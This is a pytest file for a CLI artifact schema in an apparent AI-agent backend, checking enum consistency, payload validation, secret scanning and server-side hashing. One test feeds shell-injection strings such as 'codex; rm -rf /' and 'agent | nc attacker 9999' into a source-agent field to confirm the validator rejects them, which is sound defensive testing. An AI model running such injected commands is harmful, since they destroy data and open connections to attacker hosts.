"""Sprint 6 BL-0064: CLI artifact schema contract tests.

5+ source 整合 (`.claude/rules/cross-source-enum-integrity.md §1`):
- DB CHECK: migrations/versions/0012_cli_artifact_kind_11.py の
  ``_ARTIFACT_KIND_11_CHECK_SQL`` 文字列に CLI 5 種が含まれる
- ORM CheckConstraint: backend.app.db.models.artifact.Artifact の
  ``artifacts_ck_kind`` constraint 内に CLI 5 種が含まれる
- Python Literal: ``backend.app.db.models.artifact.ArtifactKind`` の
  type Literal 11 値 (既存 6 + CLI 5) と ``ALL_ARTIFACT_KINDS`` tuple
- Pydantic: ``backend.app.domain.cli_artifact.CliArtifactPayload``
- pytest (本 file): ``EXPECTED_CLI_ARTIFACT_KINDS`` constant
"""

from __future__ import annotations

import hashlib
import importlib
import inspect
import re
from pathlib import Path
from typing import get_args

import pytest
from pydantic import ValidationError

from backend.app.db.models.artifact import (
    ALL_ARTIFACT_KINDS,
    ArtifactKind,
)
from backend.app.domain.cli_artifact import (
    ALL_CLI_ARTIFACT_KINDS,
    CliArtifactKind,
    CliArtifactPayload,
    parse_cli_artifact_markdown,
)
from backend.app.domain.cli_artifact.schema import compute_content_hash

EXPECTED_CLI_ARTIFACT_KINDS: tuple[str, ...] = (
    "cli_input",
    "cli_stdout",
    "cli_stderr",
    "cli_exit",
    "cli_result_summary",
)

EXPECTED_ALL_ARTIFACT_KINDS: tuple[str, ...] = (
    "plan",
    "patch",
    "evidence",
    "citation",
    "provider_continuation_ref",
    "other",
    "cli_input",
    "cli_stdout",
    "cli_stderr",
    "cli_exit",
    "cli_result_summary",
    # SP-010 batch 3 (BL-0118 Research-to-Ticket adapter): the 12th
    # artifact kind. Added by migration 0018 (drop + recreate
    # ``artifacts_ck_kind`` with the extended set).
    "research_promotion",
)


# --- 5+ source 整合 -------------------------------------------------------


def test_cli_artifact_kinds_literal_matches_constant() -> None:
    assert ALL_CLI_ARTIFACT_KINDS == EXPECTED_CLI_ARTIFACT_KINDS
    assert set(get_args(CliArtifactKind)) == set(EXPECTED_CLI_ARTIFACT_KINDS)


def test_artifact_kinds_literal_12_after_sp010_batch3() -> None:
    """SP-010 batch 3 (BL-0118) extended this 11 -> 12 by adding
    ``research_promotion`` for the Research-to-Ticket adapter."""
    assert ALL_ARTIFACT_KINDS == EXPECTED_ALL_ARTIFACT_KINDS
    literal_args = set(get_args(ArtifactKind))
    assert literal_args == set(EXPECTED_ALL_ARTIFACT_KINDS)
    assert len(literal_args) == 12
    for cli_kind in EXPECTED_CLI_ARTIFACT_KINDS:
        assert cli_kind in literal_args, cli_kind
    assert "research_promotion" in literal_args


def test_migration_0012_check_constraint_contains_11_kinds() -> None:
    """Migration 0012 added the 11 kinds known at that time (Sprint 6).
    ``research_promotion`` (the 12th) was added later by migration 0018
    (SP-010 batch 3); the 0012 file is unchanged from its original
    11-kind state and we verify the 11 are still present, not the
    superset of 12 from EXPECTED_ALL_ARTIFACT_KINDS."""
    migration_path = (
        Path(__file__).resolve().parents[2]
        / "migrations"
        / "versions"
        / "0012_cli_artifact_kind_11.py"
    )
    text = migration_path.read_text(encoding="utf-8")
    _MIGRATION_0012_KINDS: tuple[str, ...] = (
        "plan",
        "patch",
        "evidence",
        "citation",
        "provider_continuation_ref",
        "other",
        "cli_input",
        "cli_stdout",
        "cli_stderr",
        "cli_exit",
        "cli_result_summary",
    )
    for kind in _MIGRATION_0012_KINDS:
        assert f"'{kind}'" in text, f"migration missing kind literal {kind!r}"
    # downgrade SQL must contain only the legacy 6
    assert "_ARTIFACT_KIND_6_CHECK_SQL" in text
    for cli_kind in EXPECTED_CLI_ARTIFACT_KINDS:
        # CLI 5 種 must NOT appear in the legacy 6 string literal.
        # Find _ARTIFACT_KIND_6_CHECK_SQL block and assert CLI kinds absent.
        legacy_match = re.search(
            r"_ARTIFACT_KIND_6_CHECK_SQL\s*=\s*\(\s*\"([^\"]+)\"\s*\)",
            text,
        )
        assert legacy_match is not None
        legacy_sql = legacy_match.group(1)
        assert f"'{cli_kind}'" not in legacy_sql


def test_orm_check_constraint_contains_11_kinds() -> None:
    from backend.app.db.models.artifact import Artifact  # noqa: PLC0415

    constraint_names: dict[str, str] = {}
    for arg in Artifact.__table_args__:
        if hasattr(arg, "name") and hasattr(arg, "sqltext"):
            constraint_names[arg.name] = str(arg.sqltext)
    assert "artifacts_ck_kind" in constraint_names
    sql = constraint_names["artifacts_ck_kind"]
    for kind in EXPECTED_ALL_ARTIFACT_KINDS:
        assert f"'{kind}'" in sql, f"ORM constraint missing kind {kind!r}"


# --- CliArtifactPayload schema -------------------------------------------


def _hash(value: str) -> str:
    return hashlib.sha256(value.encode("utf-8")).hexdigest()


def test_payload_accepts_valid_cli_input() -> None:
    payload = CliArtifactPayload(
        run_id="11111111-1111-1111-1111-111111111111",
        artifact_kind="cli_input",
        content_hash=_hash("instruction text"),
        payload_data_class="internal",
        source_agent="codex",
        schema_version="1.0.0",
        body="Please implement Sprint 6 BL-0064.",
    )
    assert payload.artifact_kind == "cli_input"
    assert payload.payload_data_class == "internal"


def test_payload_rejects_unknown_artifact_kind() -> None:
    with pytest.raises(ValidationError):
        CliArtifactPayload(
            run_id="r",
            artifact_kind="cli_unknown",  # type: ignore[arg-type]
            content_hash=_hash("x"),
            payload_data_class="internal",
            source_agent="codex",
            body={"k": "v"},
        )


def test_payload_rejects_short_content_hash() -> None:
    with pytest.raises(ValidationError) as exc:
        CliArtifactPayload(
            run_id="r",
            artifact_kind="cli_input",
            content_hash="0123abcd",  # not 64 chars
            payload_data_class="internal",
            source_agent="codex",
            body="x",
        )
    assert "SHA-256" in str(exc.value)


def test_payload_rejects_uppercase_content_hash() -> None:
    with pytest.raises(ValidationError):
        CliArtifactPayload(
            run_id="r",
            artifact_kind="cli_input",
            content_hash="A" * 64,
            payload_data_class="internal",
            source_agent="codex",
            body="x",
        )


def test_payload_rejects_invalid_schema_version() -> None:
    with pytest.raises(ValidationError) as exc:
        CliArtifactPayload(
            run_id="r",
            artifact_kind="cli_input",
            content_hash=_hash("x"),
            payload_data_class="internal",
            source_agent="codex",
            schema_version="1.0.x",
            body="x",
        )
    assert "semver" in str(exc.value).lower()


@pytest.mark.parametrize(
    "bad_agent",
    [
        "codex; rm -rf /",
        "claude && curl evil",
        "agent | nc attacker 9999",
        "$(whoami)",
        "`uname`",
        "agent<redirect",
        "agent>/dev/null",
    ],
)
def test_payload_rejects_shell_metachars_in_source_agent(bad_agent: str) -> None:
    with pytest.raises(ValidationError) as exc:
        CliArtifactPayload(
            run_id="r",
            artifact_kind="cli_input",
            content_hash=_hash("x"),
            payload_data_class="internal",
            source_agent=bad_agent,
            body="x",
        )
    assert "shell metacharacters" in str(exc.value)


def test_payload_rejects_extra_fields() -> None:
    with pytest.raises(ValidationError):
        CliArtifactPayload(
            run_id="r",
            artifact_kind="cli_input",
            content_hash=_hash("x"),
            payload_data_class="internal",
            source_agent="codex",
            body="x",
            unknown_field="should_be_rejected",  # type: ignore[call-arg]
        )


def test_payload_is_frozen() -> None:
    payload = CliArtifactPayload(
        run_id="r",
        artifact_kind="cli_input",
        content_hash=_hash("x"),
        payload_data_class="internal",
        source_agent="codex",
        body="x",
    )
    with pytest.raises(ValidationError):
        payload.payload_data_class = "pii"  # type: ignore[misc]


# --- Body raw-secret scan -------------------------------------------------


def test_payload_body_dict_rejects_prohibited_key() -> None:
    with pytest.raises(ValidationError) as exc:
        CliArtifactPayload(
            run_id="r",
            artifact_kind="cli_result_summary",
            content_hash=_hash("body"),
            payload_data_class="internal",
            source_agent="codex",
            body={"api_key": "leaked"},
        )
    assert "prohibited" in str(exc.value).lower()


def test_payload_body_dict_rejects_openai_token_in_value() -> None:
    leak = "sk-" + "A" * 40
    with pytest.raises(ValidationError) as exc:
        CliArtifactPayload(
            run_id="r",
            artifact_kind="cli_result_summary",
            content_hash=_hash("body"),
            payload_data_class="internal",
            source_agent="codex",
            body={"output": leak},
        )
    assert "raw secret" in str(exc.value).lower()


def test_payload_body_str_rejects_raw_secret() -> None:
    """Codex SP6B1 R3 F-SP6B1-R3-001 adopt: schema は fail-closed の最後の
    gate として str body も raw secret scan する。"""

    leak = "sk-" + "B" * 40
    with pytest.raises(ValidationError) as exc:
        CliArtifactPayload(
            run_id="r",
            artifact_kind="cli_stdout",
            content_hash=_hash(leak),
            payload_data_class="internal",
            source_agent="codex",
            body=leak,
        )
    assert "raw secret" in str(exc.value).lower()


def test_payload_body_str_accepts_redacted_content() -> None:
    """str body の redacted (raw secret なし) は受理されることを確認。"""

    redacted = "OPENAI_API_KEY=[REDACTED]\nOK"
    payload = CliArtifactPayload(
        run_id="r",
        artifact_kind="cli_stdout",
        content_hash=_hash(redacted),
        payload_data_class="internal",
        source_agent="codex",
        body=redacted,
    )
    assert payload.body == redacted


# --- Markdown frontmatter parser ------------------------------------------


def test_parse_markdown_extracts_yaml_and_body() -> None:
    text = (
        "---\n"
        "run_id: r-1\n"
        "artifact_kind: cli_input\n"
        "schema_version: 1.0.0\n"
        "---\n"
        "Body content goes here.\n"
    )
    frontmatter, body = parse_cli_artifact_markdown(text)
    assert frontmatter["run_id"] == "r-1"
    assert frontmatter["artifact_kind"] == "cli_input"
    assert frontmatter["schema_version"] == "1.0.0"
    assert "Body content goes here." in body


def test_parse_markdown_rejects_missing_frontmatter() -> None:
    with pytest.raises(ValueError, match="frontmatter"):
        parse_cli_artifact_markdown("plain body without frontmatter")


def test_parse_markdown_rejects_empty_frontmatter() -> None:
    with pytest.raises(ValueError, match="empty"):
        parse_cli_artifact_markdown("---\n   \n---\nbody\n")


def test_parse_markdown_rejects_non_mapping_yaml() -> None:
    with pytest.raises(ValueError, match="mapping"):
        parse_cli_artifact_markdown("---\n- item1\n- item2\n---\nbody\n")


# --- Server-owned content_hash ---------------------------------------------


def test_compute_content_hash_matches_sha256() -> None:
    body = b"deterministic body"
    expected = hashlib.sha256(body).hexdigest()
    assert compute_content_hash(body) == expected


def test_compute_content_hash_is_pure() -> None:
    body = b"abc"
    h1 = compute_content_hash(body)
    h2 = compute_content_hash(body)
    assert h1 == h2 == hashlib.sha256(body).hexdigest()


# --- caller-supplied 経路の signature レベル削除 (server-owned-boundary §1) --


def test_payload_signature_has_no_allowed_data_class_field() -> None:
    """``allowed_data_class`` は Provider Compliance Matrix からのみ resolve、
    CLI artifact payload に caller-supplied field として存在してはいけない。"""

    fields = set(CliArtifactPayload.model_fields.keys())
    assert "allowed_data_class" not in fields


def test_compute_content_hash_signature_takes_bytes_not_user_hex() -> None:
    """server-owned-boundary §1: content_hash は server-side 計算であり、
    caller が任意 hex を渡せる経路を残さない。
    ``compute_content_hash`` は bytes payload を受け取り、hex は返り値のみ。"""

    hints = inspect.get_annotations(compute_content_hash, eval_str=True)
    sig = inspect.signature(compute_content_hash)
    params = list(sig.parameters.values())
    assert len(params) == 1
    assert params[0].name == "payload"
    assert hints["payload"] is bytes
    assert hints["return"] is str


# --- 既存 ArtifactKind との sync ------------------------------------------


def test_cli_artifact_module_reimport_does_not_diverge() -> None:
    """5+ source の Python Literal を再 import しても drift しない (frozenset 等の
    実行時計算がない pure constant であることを保証)。"""

    schema_mod = importlib.import_module("backend.app.domain.cli_artifact.schema")
    artifact_mod = importlib.import_module("backend.app.db.models.artifact")
    assert schema_mod.ALL_CLI_ARTIFACT_KINDS == EXPECTED_CLI_ARTIFACT_KINDS
    assert set(schema_mod.ALL_CLI_ARTIFACT_KINDS).issubset(
        set(artifact_mod.ALL_ARTIFACT_KINDS)
    )
